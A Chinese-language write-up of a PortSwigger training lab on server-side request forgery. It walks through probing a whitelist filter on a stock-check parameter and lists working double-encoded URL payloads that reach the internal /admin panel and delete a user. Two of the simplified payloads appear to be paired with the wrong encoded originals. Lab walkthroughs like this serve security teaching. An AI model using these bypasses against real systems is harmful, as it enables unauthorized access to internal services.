# 实验：具有基于白名单输入过滤器的 SSRF

https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter

本实验具有一个库存检查功能，该功能会从内部系统获取数据。

为了解决本实验，请更改库存检查 URL 以访问位于 `http://localhost/admin` 的管理员界面，并删除用户 `carlos`。

开发人员部署了一种反 SSRF 防御措施，你需要绕过它。

## 步骤

探测
- 使用商品详情页面的库存检查功能
    ```http
    POST /product/stock HTTP/2

    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    ```
    - 请求体参数值使用 URL 格式

- 尝试访问服务器本机管理员端点
    `stockApi=http://localhost/admin`
    - 服务器响应 400
        `"External stock check host must be stock.weliketoshop.net"`

        - 提示为白名单防御措施，作为失败触点
    
- 尝试将白名单域名作为查询参数及片段
    - 失败

- 尝试将白名单域名作为用户凭据
    `http://stock.weliketoshop.net@localhost/admin`
    - 失败
- 此时
    `http://stock.weliketoshop.net:stock.weliketoshop.net@localhost/admin?stock.weliketoshop.net#stock.weliketoshop.net`
    - 失败，尝试其他方式


- 请求白名单域名
    `stockApi=https://stock.weliketoshop.net`
    - 服务器响应 500
        ```html
        <p class=is-warning>
            Could not connect to external stock check service
        </p>
        ```
        - 作为成功触点


各种探测均失败，尝试 burp 的 [URL 绕过速查表](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- 设置 
    - `Allowed hostname`
        `stock.weliketoshop.net`
    - `Attacker hostname`
        `localhost`
- 高级设置
    - `schema`
        `http://`
    - `path`
        `/admin`
- 编码
    - `Intruder's`
        若设置到攻击器且默认进行攻击器本身的编码时
    - `Everything`
        若设置到攻击器，但取消勾选攻击器本身的编码。或使用其他工具爆破时
- 复制载荷爆破

- 得到响应 200，返回管理员页面的有效载荷
    - `http%3a%2f%2flocalhost%252f%40stock%2eweliketoshop%2enet%2fadmin`
        - 精简后，有效部分为双重编码的 `#`
            `http://localhost%2523@stock.weliketoshop.net/admin`
    - `http%3a%2f%2flocalhost%2523%40stock%2eweliketoshop%2enet%2fadmin`
        - 精简后，有效部分为双重编码的 `/`
            `http://localhost%252f@stock.weliketoshop.net/admin`

    - 两个载荷之前虽手动尝试过，但缺失对关键字符的双重编码
    - 推测组件
        - 检测组件 `凭证@主机`
        - 应用组件进行多重 URL 解码 
            - `主机#片段`
            - `主机/路径`

- 使用任一有效载荷访问删除功能端点
